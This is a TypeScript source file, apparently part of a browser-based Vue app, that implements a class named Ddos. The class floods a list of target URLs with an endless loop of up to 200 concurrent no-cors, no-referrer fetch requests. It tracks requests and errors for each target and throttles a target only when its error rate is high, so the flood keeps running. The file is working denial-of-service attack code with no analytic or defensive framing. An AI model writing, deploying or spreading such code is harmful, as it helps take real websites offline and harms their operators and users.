export interface TargetDef {
    url: string
}

export interface Target {
    url: string
    requests: number
    errors: number
}

class TargetHandler {
    target: Target
    private responses: number
    private errors: number

    constructor(target: Target) {
        this.target = target
        this.responses = 0
        this.errors = 0
    }

    registerError(){
        this.target.errors++
        this.errors++
    }

    registerResponse(){
        this.target.requests++
        this.responses++
        if (this.responses > 2000){
            this.resetRate()
        }
    }

    get hasBadRate(){
        return this.responses > 1000 && (this.errors/this.responses)>0.8
    }

    private resetRate(){
        this.responses = 0
        this.errors = 0
    }
}

interface FetchConfig {
    timeout: number
}

export class Ddos {
    targets = ref<Array<Target>>([])
    handlers = Array<TargetHandler>()
    CONCURRENCY_LIMIT = 200
    queue = new Array<Promise<any>>()

    isEmpty() {
        return this.targets.value.length == 0
    }

    setTargets(rawTargets: Array<TargetDef>){
        this.queue = []
        this.targets.value = rawTargets.map((def) => {
            return {
                url: def.url,
                requests: 0,
                errors: 0
            }
        })

        for(var i = 0; i < this.targets.value.length; i++){
            this.handlers[i] = new TargetHandler(this.targets.value[i])
            this.flood(i)
        }
    }

    private fetchWithTimeout(resource: string, options: FetchConfig) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), options.timeout);
        return fetch(resource, {
            signal: controller.signal,
            mode: 'no-cors',
            referrerPolicy: 'no-referrer',
        })
            .then(response => {
                clearTimeout(id);
                return response;
            })
            .catch(error => {
                clearTimeout(id);
                throw error;
            });
    }

    private async flood(idx: number) {
        for (;;) {
            if (idx >= this.targets.value.length) break
            const targetHandler = this.handlers[idx]

            if (targetHandler.hasBadRate){
                await this.sleep(10*60*1000)
            }

            if (this.queue.length > this.CONCURRENCY_LIMIT) {
                // eslint-disable-next-line no-await-in-loop
                await this.queue.shift();
            }

            const target_url = targetHandler.target.url
            this.queue.push(
                this.fetchWithTimeout(target_url, { timeout: 1000 })
                    .catch(error => {
                        if (error.code === 20) return;

                        targetHandler.registerError()
                        console.log("Error returned "+target_url+error.message)
                    })
                    .then(response => {
                        if (response && !response.ok) {
                            targetHandler.registerError()
                            console.log("Have response but failed "+target_url+" " + response.statusText)
                        }

                        targetHandler.registerResponse()
                    }),
            );
        }
    }

    private sleep(ms: number) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}